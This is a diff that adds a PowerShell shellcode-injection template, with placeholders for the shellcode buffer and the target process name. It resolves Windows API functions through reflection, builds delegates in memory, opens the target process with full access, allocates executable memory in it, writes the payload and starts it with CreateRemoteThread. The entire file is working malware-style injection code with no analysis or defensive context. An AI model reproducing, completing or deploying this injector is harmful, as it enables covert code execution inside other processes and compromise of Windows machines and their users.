@@ -1,0 +1,52 @@
+function LookupFunc {
+    Param($modName, $funcName)
+    $assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
+                    $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp = @()
+    $assembly.GetMethods() | ForEach-Object {
+        if($_.Name -eq "GetProcAddress") {$tmp += $_}
+    }
+    return $tmp[0].Invoke($null, @(($assembly.GetMethod('GetModuleHandle')).Invoke($null, @($modName)), $funcName))
+}
+
+
+function getDelegateType() {
+    Param(
+            [Parameter(Position = 0, Mandatory = $true)] [Type[]] $funcArguments,
+            [Parameter(Position = 1)] [Type] $retType = [Void])
+    
+    $type = ([AppDomain]::CurrentDomain).DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+                        DefineDynamicModule('InMemoryModule', $false).
+                        DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
+                             [System.Reflection.CallingConventions]::Standard,
+                             $funcArguments).SetImplementationFlags('RunTime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $funcArguments).SetImplementationFlags('RunTime, Managed')
+
+    return $type.CreateType()
+}
+
+{SHELLTOREPLACE}
+
+$size = $buf.Length
+
+[Int32] $pid = [System.Diagnostics.Process]::GetProcessesByName("{TARGETPROCESS}")[0].id
+$pid
+
+$procH = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32],[Bool],[Int32]) ([IntPtr]))).
+        Invoke(0x001F0FFF, 1, $pid)
+
+$retPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr],[IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr]))).
+        Invoke($procH, [IntPtr]::Zero, $size, 0x3000, 0x40)
+
+[IntPtr] $writtenSize = [IntPtr]::Zero
+
+$boolret = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr],[IntPtr],[Byte[]],[Int32],[IntPtr]) ([Bool]))).
+        Invoke($procH, $retPtr, $buf, $size, $writtenSize)
+$writtenSize
+        
+$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).
+        Invoke($procH, [IntPtr]::Zero, 0, $retPtr, [IntPtr]::Zero, 0, [IntPtr]::Zero)       
+
+# Start-Sleep -s 15
